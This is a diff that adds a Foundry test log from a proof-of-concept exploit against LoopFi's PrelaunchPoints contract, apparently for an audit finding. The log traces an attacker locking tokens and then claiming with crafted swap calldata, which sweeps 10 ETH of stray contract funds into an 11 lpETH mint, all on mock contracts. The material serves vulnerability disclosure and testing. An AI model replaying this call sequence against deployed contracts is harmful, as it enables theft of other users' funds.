@@ -1,0 +1,156 @@
+Compiling 36 files with Solc 0.8.20
+Solc 0.8.20 finished in 630.58ms
+Compiler run successful!
+
+Ran 1 test for test/33354-h-01-availability-of-deposit-invariant-can-be-bypassed-code4_exp.sol:PoC_33354_LoopFi
+[PASS] test_H01_disallowedDepositAndTheftViaBalanceClaim() (gas: 318960)
+Logs:
+  lpETH minted to attacker : 11.000000000000000000
+  fair (1:1 swap) entitlement: 1.000000000000000000
+  stolen stray ETH (excess) : 10.000000000000000000
+
+Traces:
+  [5706534] PoC_33354_LoopFi::setUp()
+    ├─ [159800] → new MockExchangeProxy@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 798 bytes of code
+    ├─ [0] VM::deal(MockExchangeProxy: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000000 [1e21])
+    │   └─ ← [Return]
+    ├─ [798124] → new LRToken@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 3759 bytes of code
+    ├─ [2844528] → new PrelaunchPoints@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   └─ ← [Return] 13752 bytes of code
+    ├─ [822350] → new MockLpETH@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
+    │   └─ ← [Return] 3880 bytes of code
+    ├─ [815743] → new MockLpETHVault@0xc7183455a4C133Ae270771860664b6B7ec320bB1
+    │   └─ ← [Return] 3847 bytes of code
+    └─ ← [Stop]
+
+  [403965] PoC_33354_LoopFi::test_H01_disallowedDepositAndTheftViaBalanceClaim()
+    ├─ [47293] LRToken::mint(0x0000000000000000000000000000000000a11ACc, 1000000000000000000 [1e18])
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000a11ACc, value: 1000000000000000000 [1e18])
+    │   ├─  storage changes:
+    │   │   @ 2: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   @ 0x4eb2009c8f726dcc6aadc29226c4b0cf6e7d3641fea7e7fc3593931fc502068b: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   └─ ← [Stop]
+    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000a11ACc)
+    │   └─ ← [Return]
+    ├─ [25298] LRToken::approve(PrelaunchPoints: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 1000000000000000000 [1e18])
+    │   ├─ emit Approval(owner: 0x0000000000000000000000000000000000a11ACc, spender: PrelaunchPoints: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], value: 1000000000000000000 [1e18])
+    │   ├─  storage changes:
+    │   │   @ 0xbb9c2a6be116effa3d01bf84c1435d6f9cb3d7b1279eb837b39788c12b5d9db9: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   └─ ← [Return] true
+    ├─ [59325] PrelaunchPoints::lock(LRToken: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 1000000000000000000 [1e18], 0x0000000000000000000000000000000000000000000000000000000000000001)
+    │   ├─ [26816] LRToken::transferFrom(0x0000000000000000000000000000000000a11ACc, PrelaunchPoints: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 1000000000000000000 [1e18])
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000a11ACc, to: PrelaunchPoints: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], value: 1000000000000000000 [1e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xbb9c2a6be116effa3d01bf84c1435d6f9cb3d7b1279eb837b39788c12b5d9db9: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   │   │   @ 0x4eb2009c8f726dcc6aadc29226c4b0cf6e7d3641fea7e7fc3593931fc502068b: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   │   │   @ 0xb3024e141922907eb80bf787d622b0c592108908135c35e38e6ebb7d5636f1e4: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Return] true
+    │   ├─ emit Locked(user: 0x0000000000000000000000000000000000a11ACc, amount: 1000000000000000000 [1e18], token: LRToken: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], referral: 0x0000000000000000000000000000000000000000000000000000000000000001)
+    │   ├─  storage changes:
+    │   │   @ 0x5ff42b5f0e1d381c98b4b3f9e4789aff0f88857bc2a839027e0ed564aac51087: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [1149] PrelaunchPoints::balances(0x0000000000000000000000000000000000a11ACc, LRToken: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000 [1e18]
+    ├─ [0] VM::assertEq(1000000000000000000 [1e18], 1000000000000000000 [1e18], "lock failed") [staticcall]
+    │   └─ ← [Return]
+    ├─ [52091] PrelaunchPoints::setLoopAddresses(MockLpETH: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], MockLpETHVault: [0xc7183455a4C133Ae270771860664b6B7ec320bB1])
+    │   ├─ emit LoopAddressesUpdated(loopAddress: MockLpETH: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], vaultAddress: MockLpETHVault: [0xc7183455a4C133Ae270771860664b6B7ec320bB1])
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x0000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a9
+    │   │   @ 1: 0 → 0x000000000000000000000000c7183455a4c133ae270771860664b6b7ec320bb1
+    │   │   @ 6: 0x000000000000000000000000000000000000000000000000ffffffff009e3401 → 0x000000000000000000000000000000000000000000000000ffffffff00000001
+    │   └─ ← [Stop]
+    ├─ [0] VM::deal(0x0000000000000000000000000000000000a11ACc, 1000000000000000000 [1e18])
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(0x0000000000000000000000000000000000a11ACc)
+    │   └─ ← [Return]
+    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 7abfd84c00000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ [668] PrelaunchPoints::lockETH{value: 1000000000000000000}(0x0000000000000000000000000000000000000000000000000000000000000001)
+    │   └─ ← [Revert] NoLongerPossible()
+    ├─ [0] VM::warp(604802 [6.048e5])
+    │   └─ ← [Return]
+    ├─ [17689] PrelaunchPoints::convertAllETH()
+    │   ├─ [7570] MockLpETH::deposit(PrelaunchPoints: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a])
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: PrelaunchPoints: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], value: 0)
+    │   │   └─ ← [Return] 0
+    │   ├─ [829] MockLpETH::balanceOf(PrelaunchPoints: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ emit Converted(amountETH: 0, amountlpETH: 0)
+    │   ├─  storage changes:
+    │   │   @ 6: 0x000000000000000000000000000000000000000000000000ffffffff00000001 → 0x00000000000000000000000000000000000000000000000000093a8200000001
+    │   └─ ← [Stop]
+    ├─ [0] VM::assertEq(0, 0, "convert should have swept all ETH") [staticcall]
+    │   └─ ← [Return]
+    ├─ [555] PrelaunchPoints::loopActivation() [staticcall]
+    │   └─ ← [Return] 1
+    ├─ [0] VM::assertGt(604802 [6.048e5], 1, "deposits are closed") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::warp(604803 [6.048e5])
+    │   └─ ← [Return]
+    ├─ [0] VM::deal(0x000000000000000000000000000000000057A417, 10000000000000000000 [1e19])
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(0x000000000000000000000000000000000057A417)
+    │   └─ ← [Return]
+    ├─ [55] PrelaunchPoints::receive{value: 10000000000000000000}()
+    │   └─ ← [Stop]
+    ├─ [0] VM::assertEq(10000000000000000000 [1e19], 10000000000000000000 [1e19], "stray ETH not held") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2829] MockLpETH::balanceOf(0x0000000000000000000000000000000000a11ACc) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::prank(0x0000000000000000000000000000000000a11ACc)
+    │   └─ ← [Return]
+    ├─ [122416] PrelaunchPoints::claim(LRToken: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 100, 1, 0x415565b00000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee0000000000000000000000000000000000000000000000000de0b6b3a7640000)
+    │   ├─ [25298] LRToken::approve(MockExchangeProxy: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000 [1e18])
+    │   │   ├─ emit Approval(owner: PrelaunchPoints: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], spender: MockExchangeProxy: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000 [1e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xb480eb685b236289bf27a345c5784a1e7f2f21b48fae0fcd3889567285157801: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Return] true
+    │   ├─ [34989] MockExchangeProxy::fallback()
+    │   │   ├─ [26816] LRToken::transferFrom(PrelaunchPoints: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], MockExchangeProxy: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000 [1e18])
+    │   │   │   ├─ emit Transfer(from: PrelaunchPoints: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], to: MockExchangeProxy: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1000000000000000000 [1e18])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   │   @ 0xb480eb685b236289bf27a345c5784a1e7f2f21b48fae0fcd3889567285157801: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   │   │   │   @ 0xb3024e141922907eb80bf787d622b0c592108908135c35e38e6ebb7d5636f1e4: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [55] PrelaunchPoints::receive{value: 1000000000000000000}()
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   ├─ emit SwappedTokens(sellToken: LRToken: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], sellAmount: 1000000000000000000 [1e18], buyETHAmount: 1000000000000000000 [1e18])
+    │   ├─ [43370] MockLpETH::deposit{value: 11000000000000000000}(0x0000000000000000000000000000000000a11ACc)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0000000000000000000000000000000000a11ACc, value: 11000000000000000000 [1.1e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0 → 0x00000000000000000000000000000000000000000000000098a7d9b8314c0000
+    │   │   │   @ 0x4eb2009c8f726dcc6aadc29226c4b0cf6e7d3641fea7e7fc3593931fc502068b: 0 → 0x00000000000000000000000000000000000000000000000098a7d9b8314c0000
+    │   │   └─ ← [Return] 11000000000000000000 [1.1e19]
+    │   ├─ emit Claimed(user: 0x0000000000000000000000000000000000a11ACc, token: LRToken: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], reward: 11000000000000000000 [1.1e19])
+    │   ├─  storage changes:
+    │   │   @ 0x5ff42b5f0e1d381c98b4b3f9e4789aff0f88857bc2a839027e0ed564aac51087: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   └─ ← [Stop]
+    ├─ [829] MockLpETH::balanceOf(0x0000000000000000000000000000000000a11ACc) [staticcall]
+    │   └─ ← [Return] 11000000000000000000 [1.1e19]
+    ├─ emit log_named_decimal_uint(key: "lpETH minted to attacker ", val: 11000000000000000000 [1.1e19], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "fair (1:1 swap) entitlement", val: 1000000000000000000 [1e18], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "stolen stray ETH (excess) ", val: 10000000000000000000 [1e19], decimals: 18)
+    ├─ [0] VM::assertEq(11000000000000000000 [1.1e19], 11000000000000000000 [1.1e19], "claimedAmount != swap+stray") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertGt(11000000000000000000 [1.1e19], 1000000000000000000 [1e18], "no over-mint") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(10000000000000000000 [1e19], 10000000000000000000 [1e19], "attacker did not capture the stray ETH") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(0, 0, "stray ETH not swept") [staticcall]
+    │   └─ ← [Return]
+    ├─ [829] MockLpETH::balanceOf(0x0000000000000000000000000000000000a11ACc) [staticcall]
+    │   └─ ← [Return] 11000000000000000000 [1.1e19]
+    ├─ [0] VM::assertEq(11000000000000000000 [1.1e19], 11000000000000000000 [1.1e19], "attacker lpETH") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.64ms (3.05ms CPU time)
+
+Ran 1 test suite in 2.46s (7.64ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
